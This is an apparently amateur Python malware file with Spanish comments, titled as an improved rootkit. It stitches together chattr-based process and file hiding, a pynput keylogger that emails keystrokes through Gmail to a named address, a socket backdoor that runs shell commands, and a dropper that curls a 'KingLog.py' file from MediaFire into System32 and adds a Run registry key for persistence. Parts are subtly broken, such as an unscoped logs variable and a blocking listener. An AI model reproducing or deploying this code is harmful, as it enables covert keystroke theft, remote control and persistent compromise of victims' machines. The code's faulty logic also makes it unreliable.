# Código del Rootkit Mejorado
import subprocess

def ocultar_proceso(proceso):
    subprocess.check_call(["sudo", "chattr", "+h", f"/proc/{proceso}/"])

def ocultar_archivo(archivo):
    subprocess.check_call(["sudo", "chattr", "+i", archivo])

def ocultar_conexion_puerto(puerto):
    subprocess.check_call(["sudo", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", f"{puerto}", "-j", "DROP"])

#spyware
import socket
import os
import smtplib
import threading
import subprocess
from pynput.keyboard import Key, Listener

# Configuración del servidor para la backdoor
server_ip = "192.168.1.100"
server_port = 1234

# Configuración del correo electrónico
email_address = "alexisplus3453@gmail.com"

# Función para enviar los registros del keylogger por correo electrónico
def send_logs(logs):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email_address, "tu_contraseña")
    server.sendmail(email_address, email_address, logs)
    server.quit()

# Función para capturar las teclas pulsadas por el keylogger
def on_press(key):
    try:
        logs += str(key.char)
    except AttributeError:
        if key == Key.space:
            logs += " "
        else:
            logs += " [{0}] ".format(key)

# Configuración del keylogger
logs = ""
with Listener(on_press=on_press) as listener:
    listener.join()

# Función para ejecutar comandos en la máquina de forma remota
def execute_command(command):
    return subprocess.check_output(command, shell=True)

# Configuración de la backdoor para compartir archivos
def backdoor():
    while True:
        command = input("Ingrese el comando que desea ejecutar: ")
        output = execute_command(command)
        print(output)

# Crear el socket del server de la backdoor
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((server_ip, server_port))
server_socket.listen(1)
print("[*] Esperando conexión...")

# Aceptar la conexión y establecer backdoor
client_socket, _ = server_socket.accept()
print("[*] Conexión establecida con el cliente.")

# Iniciar el hilo para la backdoor
backdoor_thread = threading.Thread(target=backdoor)
backdoor_thread.start()
import os
import shutil
import subprocess
import sys
import random
import string

# Función para generar un nombre aleatorio para el archivo
def generar_nombre_aleatorio(extension=".py"):
    letras = string.ascii_letters + string.digits
    nombre_aleatorio = ''.join(random.choice(letras) for i in range(10))
    return nombre_aleatorio + extension

# Función para iniciar el script al inicio de la PC
def iniciar_al_inicio(script_path):
    run_key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    subprocess.call(["reg", "add", run_key, "/v", "MyScript", "/t", "REG_SZ", "/d", script_path, "/f"])

# Verificar si el archivo "KingLog.py" está presente y, si no, instalarlo automáticamente desde un enlace
def verificar_instalar():
    kinglog_url = "https://www.mediafire.com/file/czhjvvcrhibfn55/KingLog.py/file"  # Reemplaza esto con la URL real
    system32_path = os.path.join(os.environ['WINDIR'], 'System32')
    nombre_aleatorio = generar_nombre_aleatorio()

    destino = os.path.join(system32_path, nombre_aleatorio)

    if not os.path.exists(destino):
        subprocess.call(["curl", "-o", "KingLog.py", kinglog_url])
        shutil.move("KingLog.py", destino)
    
    return destino

# Llamada a las funciones
if __name__ == "__main__":
    destino_script = verificar_instalar()
    iniciar_al_inicio(destino_script)
